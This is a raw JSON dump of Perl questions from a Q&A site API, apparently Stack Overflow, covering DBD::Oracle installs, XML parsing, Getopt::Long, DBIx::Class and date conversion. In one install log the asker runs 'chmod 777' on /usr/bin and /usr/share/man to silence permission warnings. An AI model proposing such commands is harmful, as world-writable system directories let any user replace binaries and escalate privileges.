\"-Iblib/arch\" \"-Iblib/lib\" ora_explain.PL ora_explain\nExtracted ora_explain from ora_explain.PL with variable substitutions.\ncp ora_explain blib/script/ora_explain\n/usr/bin/perl \"-MExtUtils::MY\" -e \"MY-&gt;fixin(shift)\" blib/script/ora_explain\nManifying blib/man1/ora_explain.1\nManifying blib/man3/DBD::Oracle.3pm\nManifying blib/man3/DBD::Oraperl.3pm\n\n$ make install\n\n\nWarning: You do not have permissions to install into /usr/share/man/man1 at /usr/lib/perl5/5.8.8/ExtUtils/Install.pm line 114.\nFiles found in blib/arch: installing files in blib/lib into architecture dependent library tree\nWriting /usr/lib64/perl5/site_perl/5.8.8/x86_64-linux-thread-multi/auto/DBD/Oracle/.packlist\nAppending installation info to /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/perllocal.pod\n\n$ sudo - chmod 777 /usr/share/man\n\nWarning: You do not have permissions to install into /usr/bin at /usr/lib/perl5/5.8.8/ExtUtils/Install.pm line 114.\nFiles found in blib/arch: installing files in blib/lib into architecture dependent library tree\nWriting /usr/lib64/perl5/site_perl/5.8.8/x86_64-linux-thread-multi/auto/DBD/Oracle/.packlist\nAppending installation info to /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/perllocal.pod\n\n$ sudo - chmod 777 /usr/bin\n\nFiles found in blib/arch: installing files in blib/lib into architecture dependent library tree\nWriting /usr/lib64/perl5/site_perl/5.8.8/x86_64-linux-thread-multi/auto/DBD/Oracle/.packlist\nAppending installation info to /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/perllocal.pod\n\n$ perl -e 'use DBD::Oracle'\ninstall_driver(Oracle) failed: Can't load '/usr/lib64/perl5/site_perl/5.8.8/x86_64-linux-thread-multi/auto/DBD/Oracle/Oracle.so' for module DBD::Oracle: /sw/oracle/app/oracle/product/102/lib/libnnz10.so:  cannot restore segment prot after reloc: Permission denied at /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi/DynaLoader.pm line 230.\n at (eval 3) line 3\nCompilation failed in require at (eval 3) line 3.\nPerhaps a required shared library or dll isn't installed where expected\n at ./ora_dump.pl line 7\n</code></pre>\n\n<p>I've checked permission of /sw/oracle/app/oracle/product/102/lib/libnnz10.so.<br>\nMy machine is on CentOS release 5.5 and 10g Enterprise Edition Release 10.2.0.5.0...\nWhat am I missing?</p>\n"},{"tags":["perl","vector","3d","rotation"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":12757631,"title":"rotate 3d structure","body":"<p>I have an array which contains 3d modeling information x, y, z coordinates for a structure rotated and placed in the desired stance. I also have a new array which has similar structure without the rotation or placement. The new structures coordinates begin at [0 0 0].\nIt is easy to get the first portion of the structure into the right place by adding the first element of the properly rotated array to the unstructured array. My problem now is the rotation. How do I rotate the new element so that it matches the angle in x, y and z of the properly rotated array? \nThank you</p>\n"},{"tags":["perl","xml-parsing","xml-libxml"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":51,"score":3,"question_id":12811902,"title":"Perl using XML Path Context to extract out data","body":"<p>I have the following xml</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;Response&gt;\n   &lt;Function Name=\"GetSomethingById\"&gt;\n      &lt;something idSome=\"1\" Code=\"1\" Description=\"TEST01\" LEFT=\"0\" RIGHT=\"750\" /&gt;\n   &lt;/Function&gt;\n&lt;/Response&gt;\n</code></pre>\n\n<p>and I want the attributes of <code>&lt;something&gt;</code> node as a hash. Im trying like below</p>\n\n<pre><code>my $xpc = XML::LibXML::XPathContext-&gt;new(\n    XML::LibXML-&gt;new()-&gt;parse_string($xml)   # $xml is containing the above xml\n);\nmy @nodes = $xpc-&gt;findnodes('/Response/Function/something');\n</code></pre>\n\n<p>Im expecting to have something like <code>$nodes[0]-&gt;getAttributes</code>, any help?</p>\n"},{"tags":["perl","wget","lwp"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":12811296,"title":"how does wget differ from Perl's lwp?","body":"<p>Im required to use wget for its ability to work like a crawler to develop one for my project. But all around in google searches im seeing people recommend to use LWP instead of Wget. Can you guys enlighten me on why this is so?</p>\n"},{"tags":["perl","debugging"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":35,"score":-1,"question_id":12809265,"title":"Perl debugger various outputs","body":"<p>during writing script I noticed some very strange perl behavior. The task is to trim last character of string stored in $temp1 variable, this can be done using either chop($temp1) or more complicated substr($temp1, 0, length($temp1) - 1). Those both codes works as oneliners but in my script the substr solution did not works. Bellow is example from debugger:</p>\n\n<h1>1st PROBLEM:</h1>\n\n<h1>1st SOLUTION - DID NOT WORKING:</h1>\n\n<pre><code>main::(delmid_n.pl:24):     if (($state == 0) &amp;&amp; ($_ !~ $musr) &amp;&amp; ($_ !~ $lusr)) {\n&gt;&gt; n\nmain::(delmid_n.pl:54):         $strprn=substr($temp1, 0, length($temp1) - 1);\n&gt;&gt; p $temp1\n                (-,user2,t-mobile.co.uk)\\\n\n&gt;&gt; p substr($temp1, 0, length($temp1) - 1) . \"\\n\";\n                (-,user2,t-mobile.co.uk)\n\n\n  DB&lt;4&gt; \nmain::(delmid_n.pl:55):     print $strprn . \"\\n\";\n  DB&lt;4&gt; \n\n\nmain::(delmid_n.pl:56):         $temp1 = \"\";\n  DB&lt;4&gt; \n</code></pre>\n\n<p>As you can see in the $strprn variable nothing is stored but if the same piece of code (which is stored into $strprn variable) is printed via 'p' command the output is OK. This \"bug\" can be overcomed using mentioned chop() function, see code bellow:</p>\n\n<h1>2nd SOLUTION - WORKING:</h1>\n\n<pre><code>main::(delmid_w.pl:24):     if (($state == 0) &amp;&amp; ($_ !~ $musr) &amp;&amp; ($_ !~ $lusr)) {\n&gt;&gt; p $temp1\n                (-,user2,t-mobile.co.uk)\\\n\n  DB&lt;4&gt; n\nmain::(delmid_w.pl:56):     chop ($temp1);\n  DB&lt;4&gt; n\nmain::(delmid_w.pl:57):     print $temp1;\n  DB&lt;4&gt; n\n                (-,user2,t-mobile.co.uk)\nmain::(delmid_w.pl:58):         $temp1 = \"\";\n  DB&lt;4&gt;\n</code></pre>\n\n<p>The above code is exactly the same as first example but following two lines from 1st example:</p>\n\n<pre><code>$strprn=substr($temp1, 0, length($temp1) - 1);\nprint $strprn . \"\\n\";\n</code></pre>\n\n<p>are replaced with following two lines in 2nd example:</p>\n\n<pre><code>chop ($temp1);\nprint $temp1;\n</code></pre>\n\n<p>What is wrong with 2nd solution ?</p>\n\n<h1>2nd PROBLEM:</h1>\n\n<p>This is problem which I did not workaroud so far.</p>\n\n<pre><code> DB&lt;1&gt; \nmain::(delbeg_n.pl:15): $state = 0;\n  DB&lt;1&gt; \nmain::(delbeg_n.pl:16): $muser = qr/\\(-,user1,[^,]+\\.co\\.uk\\)\\\\$/;\n  DB&lt;1&gt; \nmain::(delbeg_n.pl:19): line: while (&lt;&gt;) {\n  DB&lt;1&gt; \nmain::(delbeg_n.pl:20):     chomp;      # strip record separator\n  DB&lt;1&gt; \nmain::(delbeg_n.pl:21):     @Fld = split(/\\s+/, $_,);\n  DB&lt;1&gt; \nmain::(delbeg_n.pl:23):     if (($state == 0) &amp;&amp; ($Fld[1] =~ $muser)) {\n  DB&lt;1&gt; p $Fld[1]        \n(-,user1,one2one.co.uk)\\\n\n  DB&lt;2&gt; n\nmain::(delbeg_n.pl:43):         print $_;\n  DB&lt;2&gt; p $_\nnetgroup1       (-,user1,one2one.co.uk)\\\n\n  DB&lt;3&gt; if ($Fld[1] =~ $muser) {print \"TRUE\"}\nTRUE\n</code></pre>\n\n<p>As you can see after executing line 21 in code the next execution line is 43 (the else statement). Why following condition is not evaluated as a true and code did not continues with line 23, 24, 25 ...</p>\n\n<pre><code>if (($state == 0) &amp;&amp; ($Fld[1] =~ $muser))\n\nFollowing line was inserted as a demonstration that condition should be evaluated as a true.\n\nif ($Fld[1] =~ $muser) {print \"TRUE\"}\n</code></pre>\n\n<p>Thanks a lot.</p>\n"},{"tags":["perl","cpan"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":421,"score":-1,"question_id":9614347,"title":"error running cpan the first time","body":"<p>I'm wondering if anyone can help me. I installed CPAN.pm via command line and then tried installing a module via CPAN. But I encountered an error:</p>\n\n<pre><code>Can't call method \"http\" on unblessed reference at /usr/lib/perl5/5.10.0/CPAN/FirstTime.pm line 1866.\n</code></pre>\n\n<p>Thanks a lot for any help.</p>\n\n<p>Ismael</p>\n"},{"tags":["perl"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":83,"score":-3,"question_id":12806374,"title":"check if all the strings in an array are in a second array","body":"<p>lets say I have 2 arrays</p>\n\n<pre><code>my @one = (\"one\",\"two\",\"three\",\"four\",\"five\");\nmy @two = (\"three\",\"five\");\n</code></pre>\n\n<p>How can I tell if ALL the elements in the second array are in the first?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":6,"view_count":99,"score":-5,"question_id":12445176,"title":"Find last-backup file within a directory using Perl","body":"<p>I have to write a script in Perl that will output the last backup within a particular directory. </p>\n\n<p>For ex </p>\n\n<p>The parent directory is <code>/home/Backup/</code></p>\n\n<p>In <code>/home/Backup/windows</code> i have the following files for eg</p>\n\n<pre><code>Windows_Server_A_20120901\nWindows_Server_A_20120902\nWindows_Server_A_20120903\nWindows_Server_B_20120901\nWindows_Server_B_20120902\nWindows_Server_B_20120903\nWindows_Server_XZ_20120903\nWindows_Server_XZ_20120901\nWindows_Server_XZ_20120902\nWindows_Server_XZ_20120903\n</code></pre>\n\n<p>The output should be </p>\n\n<pre><code>Windows_Server_A_20120903\nWindows_Server_B_20120903\nWindows_Server_XZ_20120903\n</code></pre>\n\n<p>In <code>/home/Backup/Unix</code> for eg i have the following files</p>\n\n<pre><code>Unix_Server_A_20120901.gz\nUnix_Server_A_20120902.gz\nUnix_Server_A_20120903.gz\nUnix_Server_B_20120901.gz\nUnix_Server_B_20120902.gz\nUnix_Server_B_20120903.gz\nUnix_Server_XY_20120901.gz\nUnix_Server_XY_20120902.gz\nUnix_Server_XY_20120903.gz\n</code></pre>\n\n<p>This output should be </p>\n\n<pre><code>Unix_Server_A_20120903.gz\nUnix_Server_B_20120903.gz\nUnix_Server_XY_20120903.gz\n</code></pre>\n\n<p>I have just take 2 example here. In <code>/home/Backup/</code> i have other directories in which other backups are done.</p>\n\n<p>Of course for each sub directory there will be a subroutine as the naming are different.</p>\n\n<p>I am a beginner in perl scripting. Your help will be highly appreciated.</p>\n\n<p>So far from my point of view what i wanted to do windows backup.</p>\n\n<ol>\n<li>strip (_20120901) ie the last 9 characters from the filename</li>\n<li>then search for the lastbackup.</li>\n</ol>\n\n<p>Can someone guide me how can I achieve this using perl.</p>\n\n<p>Thank you all.</p>\n\n<p>I try to be a bit more clear in the steps that i want to take to take out the last backup</p>\n\n<ol>\n<li>Recuperate the unique names of the servers in a array</li>\n<li>Then using the names ( ls | grep Windows_A | head -1) to get thelast backup</li>\n<li>i will be changing the directories.i wont read all the folder in /home/backup</li>\n<li>Also i dont have ton of files</li>\n</ol>\n\n<p>Windows_Server_A (3 times)\nWindows_Server_B (3 times)\nWindows_Server_XY (3 times)</p>\n\n<p>Also when i specify the path i get the whole pathname, how can i remove it</p>\n\n<pre><code>!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy @files = glob(\"Win*\");\n##my @files = glob(\"/home/backup/windows/Win*\");\n\nforeach my $file (@files) {\n\n$file = substr($file,0,-9);\n\nprint \"$file\\n\";\n\n}\nexit 0;\n</code></pre>\n\n<p>Can you please guide and also inform if the steps i am taking is not good.</p>\n\n<p>Thanks</p>\n"},{"tags":["perl","variables","scalar"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":80,"score":-2,"question_id":12590149,"title":"Preceding a number with \\ prints garbage value","body":"<p>Preceding a number with escape character '\\' produces garbage value\nEx: </p>\n\n<pre><code>$a = \\12;\nprint $a;\n</code></pre>\n\n<p>This code gives below output</p>\n\n<pre><code>SCALAR(0x2001ea8)\n</code></pre>\n\n<p>and the output changes when I again execute the program.</p>\n\n<p>If I take a value(number) from user when the user gives any input starting with zero, I dont want it to interpret as octal number. So I wanted to escape zero if the number starts with zero.</p>\n"},{"tags":["python","ruby","perl","excel","csv"],"answer_count":9,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":3379,"score":5,"question_id":1243545,"title":"Programmatically extract data from an Excel spreadsheet","body":"<p>Is there a simple way, using some common Unix scripting language (Perl/Python/Ruby) or command line utility, to convert an Excel Spreadsheet file to CSV?  Specifically, this one:</p>\n\n<p><a href=\"http://www.econ.yale.edu/~shiller/data/ie_data.xls\">http://www.econ.yale.edu/~shiller/data/ie_data.xls</a></p>\n\n<p>And specifically the third sheet of that spreadsheet (the first two being charts).</p>\n"},{"tags":["arrays","perl","dereference"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":103,"score":3,"question_id":12547449,"title":"How to declare array with existing arrays in perl?","body":"<p>So say I created a set of arrays like so:</p>\n\n<pre><code>my (@device, @mount, @type, @options, @dump, @pass) = ();\n</code></pre>\n\n<p>Then later I wanted to create an array with those arrays inside it.  How would I do that?  I tried to use:</p>\n\n<pre><code>my @columns = (@device, @mount, @type, @options, @dump, @pass);\n</code></pre>\n\n<p>and</p>\n\n<pre><code>my @columns = ([@device], [@mount], [@type], [@options], [@dump], [@pass]);\n</code></pre>\n\n<p>The issue seems to be that @columns remains empty.  I feel like I am making a really simple syntax mistake.  What have I done wrong?</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12154768,"title":"regular expression to remove white spaces in a line and extract specific columns","body":"<p>Perl regular expression to remove white spaces in a line and extract specific columns</p>\n\n<p>my line looks like this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>324446  psharma jobA      2       0       435529  0       0       0     435531\n</code></pre>\n\n<p>Here I can split the line with <a href=\"http://perldoc.perl.org/functions/split.html\" rel=\"nofollow\"><code>split</code></a> function and then save the values in an array with the below command</p>\n\n<pre><code>@strings = split(/\\s+/);\n</code></pre>\n\n<p>I do not want an extra variable. \nwith regular expression I want to extract value in column 1, 2 3, and 10 as <code>$1</code>, <code>$2</code>, <code>$3</code> and <code>$10</code>.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":12808561,"title":"Getopt::Long and anonymous subroutine","body":"<p>I've written the following code:</p>\n\n<pre><code>my $version = sub {\n    print \"$PROGNAME $VERSION - $AUTHOR\\n\";\n    exit 0;\n};\n\nmy $usage = sub {\n    print \"Usage: proll &lt;options&gt;\\n\";\n    print \"Available options:\\n\";\n    print \" -h, --help  Print this help and exit.\\n\";\n    print \" --version   Print version.\\n\";\n    print \" XdY     Launch X dice with Y faces.\\n\";\n    exit 0;\n};\n\nmy $ret = GetOptions ( \"version\" =&gt; \\$version,\n                       \"h|help\" =&gt; \\$usage );\n</code></pre>\n\n<p>But also if I call the script with <code>--version</code> or <code>--help</code> it doesn't call the subroutine. Where am I wrong?</p>\n\n<p>And if I change the code as follows, it always call the first subroutine also without any  command line parameter:</p>\n\n<pre><code>my $ret = GetOptions ( \"version\" =&gt; &amp;$version,\n                       \"h|help\" =&gt; &amp;$usage );\n</code></pre>\n"},{"tags":["perl","hashes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":53,"score":-2,"question_id":12680456,"title":"accessing value in a hash of hashes","body":"<p>I'm having trouble accessing a hash value and I'm not sure what I'm doing wrong. I do some Perl but not much with hashes.</p>\n\n<p>I'm trying to access hash value in a hash of hashes. </p>\n\n<p>Here is where I build the Hash</p>\n\n<pre><code>sub buildList\n{\n    my ($name,$gender,$father,$mother,$age);\n    my %bear_ref=();\n\n    open IN, \"&lt;input.txt\" or die \"can't open file\";\n\n    while(&lt;IN&gt;) {\n        ($name, $gender, $father, $mother, $age ) = split(/:/);\n        $bear_ref{ $name } { 'gender' } = $gender;\n        $bear_ref{ $name } { 'mother' } = $father;\n        $bear_ref{ $name } { 'father' } = $mother;\n        $bear_ref{ $name } { 'age' } = $age;\n    }\n    close IN;\n    return \\%bear_ref;\n}\n</code></pre>\n\n<p>I can access the list when I am itereting through the keys in the hash but not directly. So I'm assuming it has something to do with the way i'm getting the value from the \"keys() loop\"</p>\n\n<pre><code>for my $name (keys %$ref) {\n   $father= $ref-&gt;{ $name }-&gt;{ 'father'}; # works\n   $mother= $ref-&gt;{ $name }-&gt;{ 'mother'}; # works\n   getTree($name, $ref);\n}\n\nsub getTree\n{\n    my $bear = shift;\n    my $ref = shift;\n    my ($father, $mother);\n     $father= $ref-&gt;{ $name }-&gt;{ 'father'}; # doesn't work...have also tried with %$ref-&gt;\n     $mother= $ref-&gt;{ $name }-&gt;{ 'mother'}; # doesn't work...have also tried with %$ref-&gt;\n    print \"$father : $mother\\n\";\n\n}\n</code></pre>\n\n<p>Any help would be appreciated. </p>\n"},{"tags":["perl","warnings","undef"],"answer_count":1,"favorite_count":2,"up_vote_count":20,"down_vote_count":0,"view_count":236,"score":20,"question_id":12801530,"title":"Why does Perl's string multiplication not warn on undef?","body":"<p>Under</p>\n\n<pre><code>use strict;\nuse warnings;\nmy $foo = undef;\n</code></pre>\n\n<p>the expressions</p>\n\n<pre><code>$foo . ''\n</code></pre>\n\n<p>and</p>\n\n<pre><code>\"$foo\"\n</code></pre>\n\n<p>both produce</p>\n\n<pre><code>Use of uninitialized value $foo in ... at ...\n</code></pre>\n\n<p>but the following expression gives the empty string without warning:</p>\n\n<pre><code>$foo x 1\n</code></pre>\n\n<p>Anyone knows why? I mean, it's cool to have a nice stringification idiom (<code>$_ x 1</code> is quite much shorter than <code>defined ? \"$_\" : ''</code>), but it feels a bit weird.</p>\n"},{"tags":["perl","parsing","bison","gnu-flex","parser-generator"],"answer_count":2,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":168,"score":6,"question_id":11925259,"title":"Using Parse::Lex, is there a way to return tokens only in certain states/conditions","body":"<p>Assuming that i need to tokenize and parse only multiline comments, how will i do that using Parse::Lex. When using flex-bison, the default action for any pattern in the rules section of the lex file used to be 'skip'. </p>\n\n<pre><code>%%\n.*    ;\n%%\n</code></pre>\n\n<p>How to do this here ?</p>\n\n<p>[EDIT] Well, i tried that, i'm still missing something - here is my code - and result. Where have i gone wrong ??</p>\n\n<p>my simplified lex file:</p>\n\n<pre><code>use Parse::Lex;\nuse Regexp::Common;\nuse YParser;\nmy $lexer;\nmy @token = (\nqw|esp:TA abcdefgh|,\nqw(esp:REST .|\\n),\n);\nParse::Lex-&gt;trace;\nParse::Lex-&gt;exclusive('esp');\n$lexer = Parse::Lex-&gt;new(@token);\n$lexer-&gt;from(\\*STDIN);\n$lexer-&gt;skip(qr! [ \\t]+ | $RE{balanced}{-begin=&gt;'/*'}{-end=&gt;'*/'} !xms);\n$lexer-&gt;start('esp');\n\nmy $j = YParser-&gt;new();\n$j-&gt;YYParse(yylex =&gt; \\&amp;lex);\n\nsub lex {\n    my $token = $lexer-&gt;next;\n    return ('', undef) if $lexer-&gt;eoi;\n    if ($token-&gt;name eq 'TA' || $token-&gt;name eq 'REST') {\n        return ($token-&gt;name, {LINENO =&gt; $lexer-&gt;line, TEXT =&gt; $token-&gt;text});\n    }\n}\n</code></pre>\n\n<p>my simplified grammar file</p>\n\n<pre><code>% token TA REST\n\n%%\n\nProgram:  Element\n          | Program Element\n;\nElement:  TA\n          | REST\n;\n\n%%\n</code></pre>\n\n<p>Input file:</p>\n\n<pre><code>abcdefgh\n/*sdf*/\n</code></pre>\n\n<p>Result:\nperl lexfile.pl &lt; inputfile</p>\n\n<pre><code>Trace is ON in class Parse::Lex\nCan't call method \"name\" on an undefined value at qnlex.pl line 26, &lt;STDIN&gt; line 1.\n</code></pre>\n"},{"tags":["perl","orm","dbix-class"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12806348,"title":"DBIx::Class query fails, yet dump from DBIC_TRACE works","body":"<p>I cannot rewrite the current DB schema right now BTW, but that's beside the point to the issue I've hit, so please ignore the table structure :D</p>\n\n<p>I'm running this DB query:</p>\n\n<pre><code>my $rs = $dbx-&gt;resultset('Result')-&gt;search(\n           {\n             'result_hnd'         =&gt; 16078055,\n             'seasons.outdoor'    =&gt; 'venue.outdoors',\n             'seasons.start_date' =&gt; { '&lt;=' =&gt; 'meet.date_end'   },\n             'seasons.end_date'   =&gt; { '&gt;=' =&gt; 'meet.date_begin' },\n           },\n           {\n             'join' =&gt; [\n               {\n                 'team' =&gt; {\n                   'league_teams' =&gt; {\n                     'league' =&gt; 'seasons',\n                   },\n                 },\n               },\n               {\n                 'meet' =&gt; 'venue'\n               },\n             ],\n             '+select' =&gt; ['seasons.season_hnd','seasons.name','seasons.start_date','seasons.end_date','meet.date_begin','meet.date_end'],\n             '+as'     =&gt; ['season_hnd','season_name','s_start','s_end','m_start','m_end'],\n             columns   =&gt; ['result_hnd'],\n             group_by  =&gt; ['seasons.season_hnd'],\n           }\n         );\n</code></pre>\n\n<p>When I run this, I get no results. With DBIC_TRACE on, I see the generated SQL as:</p>\n\n<pre><code>SELECT me.result_hnd, seasons.season_hnd, seasons.name, seasons.start_date, seasons.end_date, meet.date_begin, meet.date_end FROM track.result me JOIN track.team team ON team.team_hnd = me.team_hnd LEFT JOIN track.league_team league_teams ON league_teams.team_hnd = team.team_hnd LEFT JOIN track.league league ON league.league_hnd = league_teams.league_hnd LEFT JOIN track.season seasons ON seasons.league_hnd = league.league_hnd OR seasons.league_hnd = league.parent_league_hnd JOIN track.meet meet ON meet.meet_hnd = me.meet_hnd JOIN track.venue venue ON venue.venue_hnd = meet.venue_hnd WHERE ( ( result_hnd = ? AND seasons.end_date &gt;= ? AND seasons.outdoor = ? AND seasons.start_date &lt;= ? ) ) GROUP BY seasons.season_hnd: '16078055', 'meet.date_begin', 'venue.outdoors', 'meet.date_end'\n</code></pre>\n\n<p>When I copy and paste this statement into my MYSQL client (and interpolate the placeholders), like this:</p>\n\n<pre><code>SELECT me.result_hnd, seasons.season_hnd, seasons.name, seasons.start_date, seasons.end_date, meet.date_begin, meet.date_end \n  FROM track.result me \n      JOIN track.team team ON team.team_hnd = me.team_hnd \n      LEFT JOIN track.league_team league_teams ON league_teams.team_hnd = team.team_hnd \n      LEFT JOIN track.league league ON league.league_hnd = league_teams.league_hnd \n      LEFT JOIN track.season seasons ON seasons.league_hnd = league.league_hnd OR seasons.league_hnd = league.parent_league_hnd \n      JOIN track.meet meet ON meet.meet_hnd = me.meet_hnd \n      JOIN track.venue venue ON venue.venue_hnd = meet.venue_hnd \nWHERE ( ( result_hnd = 16078055 AND seasons.end_date &gt;= meet.date_begin AND seasons.outdoor = venue.outdoors AND seasons.start_date &lt;= meet.date_end ) ) \n  GROUP BY season_hnd;\n</code></pre>\n\n<p>I get the exact result I expect (7 records).</p>\n\n<p>This is really bizarre. To all intents and purposes, isn't that exactly the same query? Am I missing something in my debugging? Or is something else happening at the DBIx::Class::ResultSet layer that isn't being dumped?</p>\n"},{"tags":["perl","shell","csv","script","filter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":9,"view_count":146,"score":-8,"question_id":12782957,"title":"How to convert this into csv","body":"<p>I'd like to have an automated conversion tool between calendar events from <a href=\"http://www.minireminder.com/home_en.htm\" rel=\"nofollow\">MiniReminder</a> into <a href=\"http://gbirthday.sourceforge.net/index.html\" rel=\"nofollow\">GBirthday</a>. </p>\n\n<p>GBirthday requires csv with two columns (no heading): </p>\n\n<ul>\n<li>date of birth in yyyy-mm-dd</li>\n<li>description</li>\n</ul>\n\n<p>MiniReminder uses the following custom plain text format:</p>\n\n<pre><code>;File created by MiniReminder 1.41 (PLEASE, DO NOT EDIT!)\n;(c) 1995-2005, Jose M Balaguer\n;www.minireminder.com\n\n10-Jan-2007 01Y 000 000 Adam's Birthday. He is now $Age{2002} old.\n14-Feb-2007 01Y 000 000 Tom's Birthday. (Now he is $Age{1979}).\n21-Mar-2007 01Y 000 000 Grandma Day\n21-May-2007 01Y 000 000 Kate's nameday.\n21-Jun-2010 01Y 000 000 Ann's Birthday ($Age{1990} years old).\n</code></pre>\n\n<p>The first 4 fields are separated by one space.</p>\n\n<p>First come date in dd-MM-yyyy; the names for months are: Jan, Feb, Mar, Apr, May, Jun, Jul, Aug, Sep, Oct, Nov, Dec. Year is ignored.</p>\n\n<p>Next 3 columns \"01Y\", \"000\" and \"000\" are ignored.</p>\n\n<p>The last field contains the description of the event. The keyword <code>$Age{..}</code> contains the year of birth. This year should be used <em>instead</em> of the year from the date (first) column.</p>\n\n<p>I believe writing such a conversion tool will take max 10 minutes if someone knows the right tool (e.g. Perl). I don't.</p>\n\n<p>Any free scripting language available for Linux will do; e.g. Perl, Python, Bash, Ruby,...</p>\n\n<p>I am a programmer myself, so I should not have problems if you will just post a concept.</p>\n\n<hr>\n\n<p>edit:</p>\n\n<p>I know it is suicide to continue this subject (At least we will see how negative reputation can get), but I feel I owe the community to benefit from the complete answer.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nmy %months = (\n    'Jan' =&gt; '01',\n    'Feb' =&gt; '02',\n    'Mar' =&gt; '03',\n    'Apr' =&gt; '04',\n    'May' =&gt; '05',\n    'Jun' =&gt; '06',\n    'Jul' =&gt; '07',\n    'Aug' =&gt; '08',\n    'Sep' =&gt; '09',\n    'Oct' =&gt; '10',\n    'Nov' =&gt; '11',\n    'Dec' =&gt; '12' );\n\nwhile (&lt;&gt;)\n{\n    next if /^\\s*;/;\n\n    my ($a, $rest) = (split/\\s+/,$_,5)[0,4];\n    my $YearFromAge;\n    my $Year;\n    my $Month;\n    my $Day;\n\n    $rest = substr($rest, 0, -2);\n\n    if ($a and $rest)\n    {\n        $a = \"$3$months{$2}$1\"\n            if ($a =~ m/(\\d\\d)-(.{3})-(\\d{4})/io);\n\n        $Year = $a;\n        $Year =~ m/^(\\d\\d\\d\\d)\\d+$/;\n        $Year = $1;\n        $YearFromAge = $rest;\n        if ($YearFromAge =~ m/\\$Age\\{(\\d\\d\\d\\d)\\}/) {\n           $Year = $1;\n        }\n\n        $Month = $a;\n        $Month =~ m/^\\d\\d\\d\\d(\\d\\d)\\d\\d$/;\n        $Month = $1;\n\n        $Day = $a;\n        $Day =~ m/^\\d\\d\\d\\d\\d\\d(\\d\\d)$/;\n        $Day = $1;\n\n        print \"$Year-$Month-$Day,\\\"$rest\\\"\\n\"; \n    }\n}\n</code></pre>\n\n<p>The important thing is that the script now parse the $Age{..} keywords, correctly handles \\n and produces the correct date format.</p>\n"}]}
{"total":22324,"page":11,"pagesize":100,"questions":[{"tags":["perl","export","undefined","subroutine"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12202575,"title":"Exported Perl sub not found","body":"<p>I run across this problem every once in a while.  For some reason I get the \"Undefined subroutine\" error when trying to call an exported sub, and I have no idea why since it seems to happen out of the blue, in mature code.  </p>\n\n<p>The last time it happened I think I resorted to using something like \"package_2::exported_sub().\"  That worked this time, but it simply returned an error for another sub in package_2.  Even putting \"use package_2;\" in the line above doesn't help!  The only thing I can think of is that the exported sub is being undefined somehow.  </p>\n\n<p>My code looks a little like this:</p>\n\n<p>in file package_1.pm:</p>\n\n<pre><code>package package_1;\n\nrequire Exporter;\n@ISA = qw( Exporter );\n\n@EXPORT = qw(\nlocal_sub\n);\n\nuse package_2;\nuse strict;\nuse warnings;\nuse diagnostics;\n\nsub local_sub {\n  &amp;exported_sub;\n}\n</code></pre>\n\n<p>in file package_2.pm:</p>\n\n<pre><code>package package_2;\n\nrequire Exporter;\n@ISA = qw( Exporter );\n\n@EXPORT = qw(\nexported_sub\n);\n\nuse strict;\nuse warnings;\nuse diagnostics;\n\nsub exported_sub {\n # do something\n}\n</code></pre>\n\n<p>I'm at my wit's end...I was working on an unrelated hot ticket when this popped up, and user testing starts tomorrow!</p>\n\n<p>Thanks in advance!</p>\n\n<hr>\n\n<p>Update:</p>\n\n<p>ikegami, thanks for your fix! I'm curious, though.  I ran across this again, but this time I never did find the circular dependency.  I narrowed it down to one line:</p>\n\n<pre><code>$row-&gt;{$attr} = '&amp;nbsp;' unless ( $row-&gt;{$attr} );\n</code></pre>\n\n<p>Obviously, the line has nothing to do with using or requiring at all!  I've looked in the Apache logs but nothing really seems to stand out, but will work to resolve whatever I find.  I'll also see if I can get more warnings.  </p>\n\n<p>Aside from that, what do you recommend as a next step?</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":55,"score":3,"question_id":12806066,"title":"What is the status of applying the \"values\" function to a hash or array reference?","body":"<p>Given that <code>$struct</code> is a data structure that can be either a hash or an array reference, I have some code that looks like this:</p>\n\n<pre><code>for (ref($struct) eq \"HASH\" ? values %$struct : values @$struct) {  \n    # process $_\n    ...\n}\n</code></pre>\n\n<p>I would like to use the new functionality of the <code>values</code> function (to accept a reference to an unblessed hash or array) to write this instead, which works in my 5.14.2 release:</p>\n\n<pre><code>for (values $struct) {  \n    # process $_ \n    ...\n}\n</code></pre>\n\n<p>So much prettier!</p>\n\n<p>But the documentation for <code>values</code> says that this feature is \"highly experimental.\"  It has been around for several releases now (5.12 through 5.16.0 as far as I can tell).  